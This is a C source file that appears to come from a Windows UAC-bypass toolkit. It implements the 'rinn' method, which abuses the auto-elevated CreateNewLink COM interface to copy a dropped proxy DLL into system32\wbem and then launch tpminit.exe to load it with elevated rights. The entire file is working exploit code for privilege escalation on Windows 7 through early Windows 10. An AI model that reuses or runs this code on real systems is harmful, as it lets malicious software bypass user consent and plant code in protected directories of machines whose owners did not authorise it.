/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2018
*
*  TITLE:       RINN.C
*
*  VERSION:     3.00
*
*  DATE:        25 Aug 2018
*
*  rinn UAC bypass using CreateNewLink interface.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmCreateNewLinkMethod
*
* Purpose:
*
* Bypass UAC using CreateNewLink autoelevated interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
* The CreateNewLink interface has method named "CreateNewLink" (MS tautology),
* where part of it implementation is CopyFileW(InputParam.Source, InputParam.Dest, 0);
* Since this code runs elevated it can be used to write data to the protected
* Windows directories such as system32. Availability: Windows 7, Windows 8, Windows 8.1.
*
* More checking added in Windows 10 interface code (file exts, file attribute flags). This may
* compilicate it epxloitation on Windows 10 prior to RS1.
*
* In RS1 and afterwards this interface is not in consent whitelist (COMAutoApprovalList).
* Because TH1 and TH2 are both EOL'ed at moment of discovery this method marked as fixed in RS1.
*
* Fixed in Windows 10 RS1 
*
*/
BOOL ucmCreateNewLinkMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL                bCond = FALSE, bApprove = FALSE;

    HRESULT             hr = E_UNEXPECTED, hr_init;

    ICreateNewLink     *CreateNewLink = NULL;
    CREATELINKDATA      LinkData;

    SIZE_T              l;

    WCHAR szDllPath[MAX_PATH * 2], szTargetPath[MAX_PATH * 2];

#ifndef _WIN64
    PVOID   OldValue = NULL;
#endif

#ifndef _WIN64
    if (g_ctx.IsWow64) {
        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
            return FALSE;
    }
#endif

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //
        // Potential fix check.
        //
        if (supIsConsentApprovedInterface(T_CLSID_CreateNewLink, &bApprove)) {
            if (bApprove == FALSE)
                if (ucmShowQuestion(UACFIX) != IDYES)
                    break;
        }

        _strcpy(szDllPath, g_ctx.szTempDirectory);
        _strcat(szDllPath, WBEMCOMN_DLL);

        l = _strlen(szDllPath);
        if (l > MAX_PATH) //CreateNewLink parameters length limited to MAX_PATH
            break;

        _strcpy(szTargetPath, g_ctx.szSystemDirectory);
        _strcat(szTargetPath, WBEM_DIR);
        _strcat(szTargetPath, WBEMCOMN_DLL);

        l = _strlen(szTargetPath);
        if (l > MAX_PATH) //CreateNewLink parameters length limited to MAX_PATH
            break;

        hr = ucmAllocateElevatedObject(
            T_CLSID_CreateNewLink,
            &IID_ICreateNewLink,
            CLSCTX_LOCAL_SERVER,
            &CreateNewLink);

        if (hr != S_OK)
            break;

        if (CreateNewLink == NULL) {
            hr = E_OUTOFMEMORY;
            break;
        }

        //
        // Drop Fubuki as wbemcomn.dll to %temp%.
        //
        if (supWriteBufferToFile(szDllPath, ProxyDll, ProxyDllSize)) {

            RtlSecureZeroMemory(&LinkData, sizeof(LinkData));

            LinkData.dwFlags = 0x200;
            _strcpy(LinkData.szExeName, szDllPath);
            _strcpy(LinkData.szLinkName, szTargetPath);

            hr = CreateNewLink->lpVtbl->CreateNewLink(CreateNewLink, &LinkData, 0);

            if (SUCCEEDED(hr)) {

                _strcpy(szTargetPath, g_ctx.szSystemDirectory);
                _strcat(szTargetPath, TPMINIT_EXE);

                //
                // Run target and wait.
                //
                if (supRunProcess(szTargetPath, NULL))
                    hr = S_OK;
                else
                    hr = E_APPLICATION_ACTIVATION_TIMED_OUT;

            }
            DeleteFile(szDllPath); //remove temp file.
        }

    } while (bCond);

    if (CreateNewLink)
        CreateNewLink->lpVtbl->Release(CreateNewLink);

#ifndef _WIN64
    if (g_ctx.IsWow64) {
        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
    }
#endif

    if (hr_init == S_OK)
        CoUninitialize();

    return SUCCEEDED(hr);
}
